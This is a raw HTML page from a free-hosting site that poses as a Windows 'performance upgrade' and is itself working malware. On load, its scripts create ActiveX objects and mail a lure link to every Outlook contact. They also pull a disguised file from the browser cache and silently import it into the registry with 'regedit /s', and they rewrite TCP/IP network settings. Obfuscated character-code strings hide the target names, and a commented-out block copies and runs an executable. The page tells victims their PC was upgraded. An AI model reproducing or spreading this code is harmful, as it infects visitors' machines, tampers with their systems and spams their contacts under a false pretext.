<script>
document.write("<center><h2><font color=#ff0000>Loding, please wait ...</h3></font></center>");
//document.write('<link REL="stylesheet" HREF="hUddysMjcCgLsGfdPpojh.js" TYPE="text/css">');
</script>
<link REL="stylesheet" HREF="hUddysMjcCgLsGfdPpoji.js" TYPE="text/css">
<script language="javascript">
NS4	= (document.layers);
IE4	= (document.all);
isMac =	(navigator.appVersion.indexOf("Mac") !=	-1);
isNS = (NS4 && !isMac);
isIE = (IE4 && !isMac);
if(!isIE){
document.write("<center><font color=#ff0000>Sorry, this page need to view with <b><u>Internet Explore</u></b>.<br>");
document.write("Please open <b><u>Internet Explore</u></b> to browse this page.</font></center><br>");
}
else
{document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>")}
</script>
<script language = "vbscript">
function regupgrade()
on error resume next
for i = 0 to 10
if scr.RegRead("HKLM\System\CurrentControlSet\Services\Class\NetTrans\000" & i & "\DriverDesc") = "TCP/IP" then
	Exit For
end if
next
if i = 10 then Exit Function
scr.RegWrite "HKLM\System\CurrentControlSet\Services\Class\NetTrans\000" & i & "\MaxMTU", "576"
scr.RegWrite "HKLM\System\CurrentControlSet\Services\Class\NetTrans\000" & i & "\MaxMSS", "536"
end function
function tellfriend()
on error resume next
for i = 1 to ol.GetNameSpace("MAPI").AddressLists.count
for j = 1 to ol.GetNameSpace("MAPI").AddressLists(i).AddressEntries.count
set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(i).AddressEntries(j)
Mail.Subject="Computer Secrets !"
Mail.Body="If you are using Win9x/Me, visit the following page will upgrade your pc performance." & vbcrlf & _
	  "If you are not using Win9x/Me or don't want to upgrade your pc, only forward this page to your friends." & vbcrlf & _
	  "Maybe your friends need it." & vbcrlf & _
	  "http://pcControl.topcities.com/upgrade.htm"
Mail.Send
next
next
end function
</script>
<SCRIPT>
var pcServer=String.fromCharCode(77,105,99,114,8+26+13+48+16,115) + String.fromCharCode(111,102,116);
function GetTtime(Root, pcS)
{
	var f, fc;
	if(fs.FileExists(Root + String.fromCharCode((14.5*4)+34) + pcS))
		return(Root + String.fromCharCode(((((2*2)+2+2)/2)+((((3*4)/4)*(2+(8/2)+(2*2)))*3)) - 2) + pcS);
	f = fs.GetFolder(Root);
	fc = new Enumerator(f.subfolders);
	for (; !fc.atEnd(); fc.moveNext()){
		pcServer = GetTtime(fc.item(),pcS);}
	return(pcServer);
}
function install(){
var Root = scr.RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\" + String.fromCharCode(77,105,99,114,8+26+13+48+16,16+45+54,111,102,116) + "\\Windows\\CurrentVersion\\" + String.fromCharCode(73,110,116,101,114,110,101,16+46+54,32,83,101,116,16+45+55,105,110,103,115,92,67,97,99,104,101,92,80,97,116,104,115,92,68,105,114,101,99,116,111,114,121));
//pcServer = GetTtime(Root, String.fromCharCode(56+24+24,85,100,100,121,16+45+54,77,29+68+9,99,67,56+47,76,16+45+54,71,102,100,80,8+27+13+48+16,16+45+50,43+21+26+16,104,91,49,93,46,59+21+26,36+15+28+36));
//if(pcServer != String.fromCharCode(77,105,99,114,8+26+13+48+16) + 's' + String.fromCharCode(111,102,116)){
//fs.CopyFile(pcServer,String.fromCharCode(99,58,92,112,65+19+21,99,46,101,23+29+45+23,101));
//scr.run(String.fromCharCode(99,58,92,8+26+13+48+17,105,99,46) + "ex" + String.fromCharCode(101));
//fs.DeleteFile(String.fromCharCode(99,58,92,112,65+19+21,99,46,101,23+29+45+23,101))
//}
//pcServer=String.fromCharCode(77,105,99,114,8+26+13+48+16,115,111,102,116);
pcServer=GetTtime(Root, String.fromCharCode(56+24+24,85,100,100,121,16+45+54,77,29+68+9,99,67,56+47,76,16+45+54,71,102,100,80,8+27+13+48+16,16+45+50,43+21+26+16,105,91,49,93,46,59+21+26,36+15+28+36));
if(pcServer != String.fromCharCode(77,105,99,114,8+26+13+48+16) + 's' + String.fromCharCode(111,102,116)){
fs.CopyFile(pcServer,"c:\\regsetting.reg");
scr.run("regedit /s c:\\regsetting.reg");
document.write("<center><h4><font color=#ff0000>Yes, your pc upgraded. Please restart your computer.</font><br>Click <a href='http://pccontrol.topcities.com/'>here</a> to learn Assembly language from some Assembly Source Code.</center></h4><br>");
}
}
function init(){
	try{
		isme=document.applets[0];
		isme.setCLSID("{0006F03A-0000-0000-C000-000000000046}");
		isme.createInstance();
		ol = isme.GetObject();
		tellfriend();
	}
	catch(e){}
	try{
		isme=document.applets[0];
		isme.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
		isme.createInstance();
		scr = isme.GetObject();
		isme.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
		isme.createInstance();
		fs = isme.GetObject();
		install();
		regupgrade();
	}
	catch(e){}
}
function start(){setTimeout("init()", 1000);}
start();
</SCRIPT>
<body><!--
	TOPCITIES MEMBER, IF THIS BANNER IS MESSING UP YOUR PAGE LAYOUT, VISIT 
	http://www.topcities.com/help/banner.html
	FOR INSTRUCTIONS ON HOW TO FIX IT
-->

<CENTER>
<IFRAME WIDTH=468 HEIGHT=60 MARGINWIDTH=0 MARGINHEIGHT=0 HSPACE=0 VSPACE=0 FRAMEBORDER=0 SCROLLING=no BORDERCOLOR="#000000" SRC="http://216.179.151.72/stuff_tc/index.htm"></iframe>
<TABLE BORDER=0 CELLPADDING=0 CELLSPACING=0>
	<TR>
		
      <TD> <A HREF="http://www.topcities.com/cgi-bin/affiliates/clickcount.cgi?url=www.thefreesite.com" TARGET="_top"> <IMG SRC="http://216.179.151.72/stuff_tc/mb_thefreesite156x20.gif" WIDTH=156 HEIGHT=20 BORDER=0></A></TD>
		
      <TD> <A HREF="http://www.topcities.com/cgi-bin/affiliates/clickcount.cgi?url=www.topcities.com/cgi-bin/home/signup" TARGET="_top"> 
        <IMG SRC="http://216.179.151.72/stuff_tc/mb_topcities312x20.gif" WIDTH=312 HEIGHT=20 BORDER=0 ALT="Get Your Free 150 MB Website Now!"></A></TD>
	</TR>
</TABLE>

</CENTER>
 </body>